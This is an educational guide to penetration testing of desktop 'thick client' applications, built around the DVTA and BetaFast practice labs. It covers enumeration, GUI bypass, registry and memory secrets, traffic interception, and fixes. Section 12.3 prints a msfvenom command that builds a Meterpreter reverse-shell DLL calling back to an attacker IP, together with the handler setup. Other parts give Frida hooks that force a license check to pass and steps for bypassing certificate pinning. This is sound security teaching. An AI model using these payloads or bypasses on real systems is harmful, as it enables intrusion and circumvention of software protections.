Thick Client · Desktop App Penetration Testing

How to test installed desktop applications: what a thick client is, how they are built, the eight-phase test flow, and the attacks that define this field. For authorized testing and defense only.

OWASP-based checklist .NET · Java · C/C++ · Electron Burp · Frida · dnSpy · Procmon DVTA · BetaFast labs Educational · authorized testing only
The whole page in five lines
  1. A thick client is an app installed on the user's machine that does real work locally. Because it runs on your machine, you control its memory, files, registry, and binary. That control is the whole game.
  2. First find out how it is built. Two-tier (app talks straight to a database) leaks raw queries and DB passwords. Three-tier (app talks to a server) turns most of the test into normal web and API testing.
  3. The client-side attacks that are unique to thick clients: read secrets from live memory, decompile and patch the binary, hijack a DLL for code execution, and intercept traffic that ignores your proxy.
  4. The blockers are almost always the same two things: the client ignores your proxy, or it pins its certificate. This page shows how to get past both.
  5. Nearly every finding reduces to one root cause: the app trusts the client. The fix is always to move the check to the server.

1What a thick client is

A thick client (also called a fat client, rich client, or just a desktop app) is a program you install on your computer that does a large part of the work on your own machine. This is the opposite of a thin client, like a website in a browser, where the server does the work and the browser only shows the result.

A thick client usually:

  • Has an installer and leaves files on disk and keys in the registry.
  • Runs as one or more processes in memory.
  • May or may not talk to a server, an API, or a database.
  • Keeps state locally: config files, logs, cached data, saved logins.

Everyday examples: Burp Suite itself, web browsers, Zoom, Microsoft Teams, Slack, PC games, trading terminals, and admin consoles.

The one idea that mattersIn web testing the server is a black box you poke from outside. In thick client testing the app runs on your machine, so you own the whole environment: its memory, its files, its registry keys, and its binary. That is why reverse engineering, memory editing, and binary patching are first-class attacks here, not edge cases.

Why they are worth attacking

  • Business rules and input checks may run only on the client, so they can be bypassed.
  • Secrets (passwords, API keys, license keys, DB connection strings, crypto keys) are often hardcoded in the binary, sitting in config or registry, or left in memory.
  • Install folders and DLL loading create privilege escalation paths (DLL hijacking, weak file or service permissions).
  • Older apps often use non-web protocols and sometimes certificate pinning, which makes traffic interception harder.

2Architecture: two-tier vs three-tier

Before anything else, find out how the app is built. There are two shapes, and which one you face decides the whole test plan.

2.1 Two-tier: app talks straight to the database

There are only two parts: the app and a database. The app holds both the screen and the business logic. It sends queries directly to the database, often over the local network, with no server in the middle.

This is the insecure shape. When you watch the traffic you often see raw SQL queries and the database username and password going across the wire. Anyone on the network can read them.

2.2 Three-tier: app talks to a server, server talks to the database

A middle server is added. The app sends requests to that server (usually over HTTP, SOAP, or gRPC). The server runs the logic and is the only thing that touches the database.

This is the safer shape, and it is good news for the tester too. Once you capture the app-to-server API traffic, most of your work becomes ordinary web and API testing (OWASP Top 10). Example: Zoom, which sends a lot of HTTP, WebSocket, and WebRTC traffic.

2.3 How to tell them apart

  1. Ask the developers. Fastest, when you can.
  2. Watch the traffic with Wireshark or a socket interceptor:
    • You see raw SQL or a database protocol on the wire, likely two-tier.
    • You see structured API calls like GET /path HTTP/1.1 and Authorization: Bearer ..., likely three-tier.

2.4 The other axis: does the app respect your proxy?

This is separate from tier count, and it decides how hard interception will be. You will meet this again in Phase 5.

3The test flow, end to end

There is no single official standard for thick client testing. The working method used across the field breaks into four big stages. The detailed eight-phase checklist (Sections 4 to 11) fits inside these four.

  1. Enumeration. Find the language and framework, the architecture (two vs three tier), whether traffic can be intercepted, and every place the app takes input.
  2. Client-side checks. This is the part that is unique to thick clients. Not simple input validation, but binary analysis, memory analysis, reverse engineering, local storage, registry, DLL hijacking, and GUI logic. Everything you can do because the app runs on your machine.
  3. Network attacks. Intercept traffic. Attack the connections the app makes to other services (a database, FTP, SMTP), for example to steal credentials off the wire.
  4. Server-side attacks. Once you can see the API, run the full OWASP Web and API Top 10, exactly like a web or mobile test.
Mental modelThe only parts that are truly different from web and mobile testing are the first two stages: enumeration and the client-side checks. The moment you are capturing API traffic, it is the same game you already know.

The three things that slow you down

  • Setup. Each app may need its own OS, runtime, and backends (SQL Server, FTP, SMTP). Take VM snapshots so you can roll back.
  • Language. Client-side attacks need you to read the app's language (Java, .NET, C++). Weak familiarity blunts this whole stage.
  • Interception. Proxy-unaware clients plus certificate pinning are the biggest practical blockers.

4Phase 1 · Enumeration

Goal: learn what you are looking at before you touch anything. Walk every screen and answer these questions.

  • Two-tier or three-tier?
  • What language and framework? (.NET, Java, C/C++, VB, Electron)
  • What does it talk to, on which ports and protocols?
  • What processes does it run?
  • What does every feature do?
  • Where are all the input points?
  • How does login and access control work?

4.1 Identify the language, do not guess it

The UI tells you nothing reliable. Open the binary in a PE inspector.

  • CFF Explorer, Detect It Easy (DIE), or PEiD. The file type gives it away. For example "Portable Executable 32 .NET Assembly" means a .NET app. Check the headers, imports, and the .NET directory.
  • strings on the binary reveals library names that point to the framework.

4.2 Watch processes and network

  • Process Explorer or Process Hacker: PID, loaded DLLs, handles, child processes.
  • TCPView: live per-process connections. Filter by the app name (for example dvta.exe) and watch new sockets appear as you trigger actions like login or backup.

4.3 Map every entry point

List every way data gets in: input fields, file imports, network listeners, IPC endpoints, command-line arguments, environment variables, registry reads, and config-file paths. This list drives the rest of the test.

Tools: CFF Explorer, Detect It Easy, PEiD, Strings, TCPView, Process Explorer, Process Hacker, Wireshark.

5Phase 2 · GUI logic

Thick client UIs often enforce rules only visually. Buttons are greyed out, forms are hidden, passwords are shown as dots. Because the UI runs on your machine, you can change all of it directly. If there is no server-side check behind a hidden control, flipping it visible is a real bypass.

5.1 What to try

  • Show hidden controls the app is hiding.
  • Enable disabled buttons and menus (for example DVTA's greyed-out "Configure Server" button, or BetaFast's hidden admin menu).
  • Unmask password fields, turning the dots back into cleartext.
  • Look for sensitive data sitting in the UI: keys, tokens, internal hostnames, debug text.
  • Test the UI for access control gaps, injection, verbose errors, weak input checks, privilege escalation (unlock admin features), and value or price manipulation.

5.2 How it is done

  • WinSpy++, Window Detective, UISpy: list Win32 window handles and change control styles. Clear ES_PASSWORD to unmask, clear WS_DISABLED to enable, set WS_VISIBLE to reveal.
  • Snoop (for WPF/XAML apps): attach to the running app, browse the visual tree, and edit any element live. Change Visibility from Hidden to Visible, or IsEnabled to true. This is exactly the BetaFast admin-panel bypass in Section 15.

Tools: WinSpy++, Window Detective, UISpy, Snoop (WPF).

6Phase 3 · Files & binary

This is the richest client-side surface. It covers everything the app ships on disk plus what you can pull out of the binary.

6.1 File permissions

Check the permissions on every file and folder the app uses: install folder, config, logs, data. A world-writable file or folder in a privileged app's path leads to tampering, DLL hijacking, or privilege escalation. Use AccessChk, AccessEnum, or icacls.

6.2 Is the binary signed and intact?

  • Check strong naming for .NET assemblies.
  • Check code signing with Sigcheck: sigcheck.exe <binary> shows Signed or Unsigned plus the publisher. An unsigned production binary is a finding and makes tampering easy.

6.3 Hunt for secrets on disk

Look in the binary and in every config or data file for:

  • Passwords, connection strings, API keys, tokens.
  • Secrets in the config file (app.config, *.exe.config, .ini, .json).
  • Hardcoded crypto material (keys, IVs, salts).
  • Cleartext storage of sensitive data.
  • Leftover data in temp files or crash dumps, and secrets written to logs.

Techniques: run strings on the binary and on-disk files (DVTA leaks an FTP password this way). Use Procmon to watch which files and paths the app reads and writes at runtime (%APPDATA%, %TEMP%, the install folder).

6.4 Manipulate and bypass

  • DLL preloading / hijacking, covered in depth in Section 12.
  • Race conditions on files the app reads and writes.
  • Replace data, config, or resource files the app trusts.
  • Call exported functions of the exe or DLLs directly (find them with CFF Explorer or dumpbin), skipping the login path.
  • Write a small wrapper that loads the app's assembly or jar and calls its public methods directly, bypassing the UI and its auth checks.
  • Decompile, edit, rebuild to recover source and keys or to remove a check (Section 13).
  • Check for lack of obfuscation. Managed .NET and Java binaries decompile to near-original source when not obfuscated, which is a confidentiality finding on its own.

Tools: Strings, dnSpy, ILSpy, Procmon, Process Hacker, CFF Explorer, Sigcheck, AccessChk, AccessEnum.

7Phase 4 · Registry

Windows thick clients often keep config and secrets in the registry, usually under HKCU\Software\<app> or HKLM\Software\<app>.

  • Check read and write access to the app's keys. A writable privileged key means tampering or privilege escalation.
  • Look for sensitive values. DVTA stores the username, a password hash, and an email under HKCU\Software\DVTA.
  • Try to change behavior by editing values, for example flipping an isLoggedIn or isAdmin flag to bypass login or elevate your role.

7.1 The efficient method: diff before and after

Do not browse the whole hive by hand. Use Regshot:

  1. Take snapshot 1 as a baseline.
  2. Do the action (install, log in, view profile).
  3. Take snapshot 2.
  4. Click Compare. The HTML diff shows only what the app changed. Searching for the app name jumps you straight to the written values, including any leaked credentials.

You can also use Procmon with a filter on RegSetValue or RegQueryValue to watch registry access live, then confirm and edit in regedit.

Tools: Regshot, Procmon, AccessEnum, regedit.

8Phase 5 · Traffic interception

This is usually the hardest phase, and it is where most engagements get stuck. The good news: the decision is mechanical. Answer two questions (does the app respect a proxy, and is it web traffic or not) and the right tool falls out. Use the finder below.

8.1 Passive first: just watch

  • Wireshark: capture on the right interface. For localhost targets use the npcap loopback adapter. Look for cleartext credentials, tokens, database queries (a two-tier smell), and FTP or SMTP logins.
  • TCPView: live per-process connections, as in enumeration.

8.3 The tools that make non-web interception possible

  • Echo Mirage: injects a DLL into the app and hooks the Winsock API (send and recv). You can view and edit any TCP or UDP traffic, including non-web protocols, and it decrypts SSL at the API boundary. Set a rule for any direction and address, then launch or inject into the app.
  • mitm_relay: a relay that listens on a local port, forwards to the real server, and tees each connection through Burp so you can use Burp on non-web protocols. Supports SSL and STARTTLS. 
    # DVTA FTP demo: move FTP to port 211, then relay 21 -> server:211 through Burp
python mitm_relay.py -l 0.0.0.0 -r tcp:21:<your-ip>:211 -p 127.0.0.1:8080
    Turn on Burp intercept, trigger "Backup data to FTP server", and the FTP USER and PASS flow through Burp.
  • InterceptSuite: a modern, maintained tool for non-web TLS and TCP interception. A good Echo Mirage replacement.
  • Frida: hooks functions at runtime (including crypto and socket calls) and is the main route for certificate pinning bypass.

8.4 Certificate pinning bypass

If the client checks for a specific pinned certificate, Burp's CA is not trusted and interception fails. Three ways past it:

  • Frida script that targets the pinning or validation routine.
  • Inject your CA into the app's trust store, if it uses the OS store or a bundled store you can replace.
  • Patch the validation method to always return "valid" (a dnSpy IL patch for .NET, a byte patch for native code). See Section 13.

8.5 Frida on desktop (.exe), not just mobile

A common misconception is that Frida is only for Android and iOS. It is not. Frida is a cross-platform instrumentation toolkit that also runs on Windows, macOS, and Linux, including plain .exe thick clients. It injects a small JavaScript engine into a running process, so you can hook and rewrite functions at runtime without touching the binary on disk.

Why it looks mobile-onlyOn a phone the OS is locked down, so you push a frida-server to a rooted device, or repackage the app with a frida-gadget. That extra step is what people remember. On a desktop you already own the machine, so you skip all of that and attach to the process directly. Same tool, fewer moving parts.

Setup and attach

pip install frida-tools

frida-ps                     # list running processes
frida -n app.exe             # attach to a running process by name
frida -p 4812                # attach by PID
frida -f C:\app\app.exe -l hook.js   # SPAWN it, hooks load before main() runs

Use spawn (-f) when the interesting thing happens at startup, like a license or certificate check. Use attach (-n) for something you trigger later in the UI.

What you hook

Instead of Java or Objective-C methods, you hook native functions by module and export name. The pattern is always the same: find the function, wrap it with Interceptor.attach, then read or change its arguments and return value.

GoalFunction to hook
Read or modify network traffic (a live Echo Mirage)ws2_32.dll!send, ws2_32.dll!recv
See plaintext and crypto keysbcrypt.dll!BCryptEncrypt, crypt32.dll functions
Watch file accesskernel32.dll!CreateFileW
Bypass a checkthe app's own validation function, force the return value
SSL pinning bypassthe cert-validation routine (schannel, or a bundled OpenSSL/BoringSSL)

Example: dump socket traffic

// hook.js
const send = Module.getExportByName('ws2_32.dll', 'send');
Interceptor.attach(send, {
  onEnter(args) {
    const len = args[2].toInt32();
    console.log('[send] ' + len + ' bytes:');
    console.log(hexdump(args[1], { length: len }));
  }
});

Run it with frida -n target.exe -l hook.js. You now see every byte the app sends, even for a raw non-web protocol, and you can rewrite it in onEnter before it leaves the machine.

Example: force a check to pass

// make an auth or license function always return true (1)
const addr = Module.getExportByName('app.exe', 'CheckLicense');
Interceptor.attach(addr, {
  onLeave(retval) { retval.replace(1); }
});
The one limitation: managed .NETFrida hooks the native layer easily. Managed .NET methods (C#, VB.NET) are JIT-compiled at runtime, so hooking a specific managed method by name is harder. In practice: use dnSpy for a permanent patch of managed logic (Section 13), and use Frida for the native side, sockets, Win32 crypto, and bundled C/C++ libraries. Bridges exist (frida-clr, Fermion), but that clean split is the fast path.

Tools: Wireshark, TCPView, Burp Suite, Echo Mirage, mitm_relay, InterceptSuite, Frida (frida-tools, frida-trace).

10Phase 7 · Memory

Because you control the machine, you can read and change the app's live memory. This is a defining thick client technique.

  • Read secrets from memory: passwords (even when the UI masks them), tokens, license keys, crypto keys, PII, connection strings.
  • Change values in memory to bypass login or elevate your role (flip a bool, overwrite a comparison result).
  • Attach a debugger, set breakpoints on auth and crypto routines, and watch or overwrite values as they pass.
  • Analyze a crash dump or full process dump for the same secrets.

10.1 The easy win: strings in memory

Using Process Hacker:

  1. Double-click the process, open the Memory tab.
  2. Click Strings, set a minimum length (for example 10) to cut noise.
  3. Filter by Contains on password, user, license, or token.

In DVTA, logging in and searching reveals the cleartext password even though the UI showed dots. In a real zero-day (Section 15), a license key was recovered the same way.

Root cause, stated correctlyEvery variable lives in RAM while an app runs. That alone is not the bug. The finding is long-lived, unmasked, unencrypted retention of secrets, which happens when developers cache credentials or keys to avoid asking again. Fix: mask or zero secrets right after use, encrypt them in memory, use protected memory such as SecureString, and keep their lifetime short.

Tools: Process Hacker, HxD, Strings, x64dbg, WinDbg, dnSpy (debugger).

12DLL hijacking (deep dive)

DLL hijacking is the flagship thick client attack. You place a malicious DLL where the app will load it before or instead of the real one. Your code then runs with the app's privileges. If the app is a service running as SYSTEM, a low-privilege user turns into SYSTEM.

12.1 Why it works: the Windows DLL search order

When an app asks for a DLL by name only (no full path), Windows searches these locations in order and loads the first match:

  1. The application's own folder
  2. The system folder (System32)
  3. The 16-bit system folder
  4. The Windows folder
  5. The current folder
  6. Each folder listed in the PATH variable

The window of opportunity: if the DLL is missing from the trusted early locations, but a folder you can write to comes earlier in the order (classically the app folder), your DLL loads instead. Writable install folders are the common real-world case. Try the simulator.

Run Process Monitor with three filters:

Then exercise every feature (login, add and view expenses, backup), because different code paths load different DLLs. Each NAME NOT FOUND on a .dll inside a writable folder is a candidate. DVTA examples: dwrite.dll, secur32.dll, sspicli.dll, cryptbase.dll, sqlite3.dll, bcrypt.dll.

12.3 From candidate to shell

Diagram E · the DLL hijack chain, proof of concept to session
flowchart LR
  P["Procmon:\nNAME NOT FOUND\n+ .dll + writable"] --> M["msfvenom:\nbuild reverse-shell DLL\nnamed exactly right"]
  M --> D["Drop DLL into\nthe app folder"]

# build the malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 \
         -f dll -a x86 --platform windows -o dwrite.dll

# catch the shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run

Host the DLL, download it on the victim (lab), rename it to the exact missing name, and drop it in the app folder. When the app runs, the DLL loads and Meterpreter opens with the app's privileges. The app itself may crash because your DLL does not implement the real exports. The shell still fires. A polished proof of concept uses a proxy DLL that re-exports to the real DLL so the app keeps working.

12.4 Fixes

  • Load DLLs with absolute paths, or use SetDllDirectory with safe-load flags like LOAD_LIBRARY_SEARCH_SYSTEM32.
  • Ship all required DLLs so none are missing.
  • Sign DLLs and verify signatures before loading.
  • Lock down install-folder permissions so standard users cannot write there.

Tools: Procmon, Impulsive_DLLHijack, msfvenom, Metasploit, Process Hacker.

13Reverse engineering & patching

This is the technique that ties the client-side stage together: read the code, find the check, remove it. It defeats client-side auth checks, license checks, feature flags, and certificate pinning validators, because they are all the same shape: a boolean or a branch you can flip.

13.1 Worked example: enable a disabled button in DVTA

DVTA's login form hardcodes configureServer.Enabled = false, with no server-side check behind it. Using dnSpy:

  1. File → Open and load dvta.exe.
  2. Browse the type tree. If the app is not obfuscated, everything is human-readable.
  3. Find the line that disables the button.
  4. Edit it. At the high level, right-click the method, choose Edit Method (C#), change false to true. At the IL level, change ldc.i4.0 (load 0, meaning false) to ldc.i4.1 (load 1, meaning true).
  5. File → Save Module (close the running app first to release the file), then relaunch. The button is now enabled.

13.3 Two shortcuts and one obstacle

  • Direct invocation. Where you can reference the assembly or jar, write a wrapper that constructs the app's classes and calls its public methods or exported functions directly, skipping the UI and any UI-only auth.
  • Obfuscation. If the managed binary is obfuscated (renamed symbols, encrypted strings, flattened control flow), clean it first. For .NET use de4dot before dnSpy. If static cleanup is hard, trace the app dynamically with a debugger or Frida instead.

14Language notes

.NET (C#, VB.NET, WPF)

  • Managed IL decompiles to near-source unless obfuscated. This is the prime target for dnSpy live edit and debug.
  • Hunt for connection strings in app.config or *.exe.config, hardcoded keys, and misuse of SecureString.
  • For WPF/XAML apps, use Snoop to walk and edit the visual tree at runtime (Visibility and IsEnabled for GUI-logic privesc).

Java

  • JARs decompile cleanly (JD-GUI, CFR, Procyon, jadx). Rebuild with Recaf or Krakatau.
  • The standard fix is obfuscation with ProGuard. Its absence is a "lack of obfuscation" finding.
  • Interception may need JVM proxy properties, a custom trust store, or Frida for pinning bypass.

Native C / C++ (and VB6)

  • No managed metadata, so use Ghidra, IDA, or x64dbg at the assembly level.
  • Memory-corruption bugs (buffer overflows) are live here, so the binary-hardening flags in Phase 6 matter most.
  • Use Winsock hooking (Echo Mirage) for interception.

Electron

  • These are JavaScript apps. Unpack app.asar with npx asar extract to get readable source, hardcoded secrets, and Node integration issues (RCE via nodeIntegration, insecure IPC). Chromium DevTools are often reachable.

17Reporting & fixes

17.1 Findings worth always reporting

  • Hardcoded or embedded secrets (binary, config, registry, memory, logs).
  • Secrets kept unmasked and unencrypted in memory.
  • Client-side-only authorization and GUI-logic bypass (disabled or hidden controls, role flags).
  • DLL hijacking, especially against an elevated service (privesc).
  • Missing binary hardening, unsigned binaries, no or weak obfuscation.
  • Insecure transport (no or weak TLS, bypassable pinning), sensitive data in transit.
  • SQLi, IDOR/BOLA, and the rest of the OWASP Web/API Top 10 on the server tier.
  • Insecure file or registry permissions, unquoted service paths.
  • Weak crypto (MD5/SHA1 password hashing, hardcoded keys), and business-logic or value manipulation.

17.2 The fixes, and the one theme behind them

One sentenceAlmost every thick client finding is the same mistake: the app trusts the client. The client is fully under the user's control, so no check that runs there is a real security boundary. The fix is always to move the decision to the server.
  • Move logic server-side (prefer three-tier) and never trust client-supplied values.
  • Store secrets safely: OS keystore or DPAPI, no hardcoding, encrypt at rest, mask and zero in memory, short lifetime.
  • Enforce authorization on the server, not through UI state.
  • Harden binaries (ASLR, DEP, CFG, SafeSEH, High-Entropy VA, strong-name and Authenticode sign) and obfuscate managed code.
  • Fix DLL loading (absolute paths, safe-load flags, ship all DLLs, sign DLLs, lock down folder permissions).
  • Protect transport (strong TLS, robust cert validation that is not trivially patchable).
  • Handle errors quietly (no stack traces, SQL, or internal data to the client).
  • Least privilege on files, registry keys, and services.

Glossary

Thick client
An installed desktop app that does real work locally, unlike a website which relies on the server.
Two-tier / three-tier
App talks straight to a database (two-tier, insecure) versus app talks to a server that talks to the database (three-tier, safer).
Proxy-aware / proxy-unaware
Whether the app honors your proxy setting. Proxy-unaware apps ignore it and need a socket interceptor.
DLL hijacking
Planting a malicious DLL where the app loads it first, gaining code execution with the app's privileges.
IL (Intermediate Language)
The bytecode .NET compiles to. It decompiles to near-source, which makes patching easy.
dnSpy
Tool that decompiles, edits, and debugs .NET assemblies, including live IL edits.
Echo Mirage / mitm_relay / InterceptSuite
Tools that intercept non-web (raw TCP) traffic by hooking sockets or relaying through Burp.
Frida
Cross-platform runtime instrumentation toolkit (Windows, macOS, Linux, Android, iOS). Hooks functions in a running app, the main route for pinning bypass. On desktop you attach directly, no server needed.
Regshot
Takes two registry snapshots and diffs them, so you see only what the app changed.
Procmon
Sysinternals Process Monitor. Live view of file, registry, and process activity, used to find DLL hijack candidates.
Certificate pinning
The app trusts only one specific certificate, which blocks a normal proxy until you bypass the check.
DVTA / BetaFast
Deliberately vulnerable practice apps for thick client testing (.NET and WPF).
